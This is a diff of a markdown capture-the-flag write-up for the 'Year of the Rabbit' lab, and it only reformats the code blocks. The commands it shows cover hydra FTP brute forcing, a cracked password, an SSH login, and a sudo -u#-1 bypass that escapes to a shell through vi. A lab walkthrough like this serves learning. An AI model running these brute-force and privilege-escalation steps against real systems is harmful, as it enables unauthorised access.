@@ -840,9 +840,13 @@ python root.py
 
 ## 7. Year of the Rabbit
 
-```nmap -sC -sV -Pn <IP>```
+```
+nmap -sC -sV -Pn <IP>
+```
 
-```gobuster dir -u <URL> -w <wordlist>```
+```
+gobuster dir -u <URL> -w <wordlist>
+```
 
 ![enum result](Assets/20.png)
 
@@ -872,7 +876,9 @@ I performed steghide --extract -sf hotbabe.png
 
 Found nothing so I did
 
-```strings hotbabe.png```
+```
+strings hotbabe.png
+```
 
 We found FTP username and a dictionary
 
@@ -880,17 +886,23 @@ We found FTP username and a dictionary
 
 Save all passwords in a file and we will brute force using hydra
 
-```hydra -l ftpuser -P rabbit.txt <IP> ftp```
+```
+hydra -l ftpuser -P rabbit.txt <IP> ftp
+```
 
 ##### Found the password – 5iez1wXKfPKQ
 
 Login using ftp
 
-```ftp <ip>```
+```
+ftp <ip>
+```
 
 We found a file
 
-```get <filename>```
+```
+get <filename>
+```
 
 We found something which we can’t decode and its called BrainFuck
 
@@ -898,17 +910,23 @@ We found something which we can’t decode and its called BrainFuck
 
 For this we will need beef
 
-```beef <filename>```
+```
+beef <filename>
+```
 
 ![enum result](Assets/26.png)
 
 Now do an ssh login
 
-```ssh eli@<IP>```
+```
+ssh eli@<IP>
+```
 
 find / -name user.txt 2>/dev/null
 
-```cat <path>```
+```
+cat <path>
+```
 
 ![enum result](Assets/27.png)
 
@@ -920,26 +938,38 @@ Now we do have a clue
 
 ![enum result](Assets/28.png)
 
-```find / -name s3cr3t 2>/dev/null```
+```
+find / -name s3cr3t 2>/dev/null
+```
 
 ![enum result](Assets/29.png)
 
 It is a directory
 
-```cd /usr/games/s3cr3t```
+```
+cd /usr/games/s3cr3t
+```
 
-```ls -la```
+```
+ls -la
+```
 
-```cat ./<filename>```
+```
+cat ./<filename>
+```
 
 ![enum result](Assets/30.png)
 ##### We found Gwendoline password
 
-```su gwendoline```
+```
+su gwendoline
+```
 
 ![enum result](Assets/31.png)
 
-```sudo -l```
+```
+sudo -l
+```
 
 ![enum result](Assets/32.png)
 
@@ -961,9 +991,13 @@ Let us use user flag but stating user as -1
 
 -1 = Confuses machine
 
-```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```
+```
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
 
-```:!/bin/sh```
+```
+:!/bin/sh
+```
 
 Locate root flag
 
